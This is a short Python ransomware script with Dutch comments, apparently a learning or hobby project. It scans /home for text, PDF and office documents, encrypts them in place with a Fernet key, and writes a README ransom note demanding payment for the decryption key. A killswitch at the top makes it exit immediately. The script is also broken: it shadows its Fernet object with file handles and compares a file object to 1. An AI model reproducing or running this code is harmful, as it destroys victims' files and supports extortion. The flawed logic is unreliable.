import os
from cryptography.fernet import Fernet

#Killswitch Functie
Killswitch = True

if Killswitch==True:
    exit()
else:
    pass

check = open("Decrypt.txt", "r")

#Hier zoek functie
#Def var voor opslaan van lijstdata van zoekfunctie.
bestandenlijst = []
# Using os.walk()
for dirpath, dirs, files in os.walk('/home'): 
  for filename in files:
    fname = os.path.join(dirpath,filename)
    if fname.endswith('.txt') or fname.endswith('.pdf') or fname.endswith('.odt') or fname.endswith('.docx'):
      bestandenlijst.append(fname)

#Decrypt
if check == 1:
   with open('key.txt', 'rb') as f:
      key = f.read()
      f = Fernet(key)
   for file in bestandenlijst:
      with open(file, 'rb') as f:
         file_inhoud = f.read()
      ontsleutelde_inhoud = f.decrypt(file_inhoud)
      with open(file, 'wb') as f:
         f.write(ontsleutelde_inhoud)
else:
   #Encryptiefunctie gebaseerd op lijst.
    with open('key.txt', 'rb') as f:
       key = f.read()
       f = Fernet(key)
    for file in bestandenlijst:
        with open(file, 'rb') as f:
            file_inhoud = f.read()
        versleutelde_data = f.encrypt(file_inhoud)
        with open(file, 'wb') as f:
            f.write(versleutelde_data)

#Readme aanmaken.
Readme = open("README.txt","w")
Readme.write("Hallo! Je hebt encryptiesoftware geactiveerd!\n Om je bestanden tedecrypten moet je geld overmaken naar XXX.\n Dan zal je de decryptkey ontvangen!")
Readme.close()

#Decryptfile
Decrypt = open("Decrypt.txt","w")
Decrypt.write("1")
Decrypt.close()

#Endstage
print("Code 200!")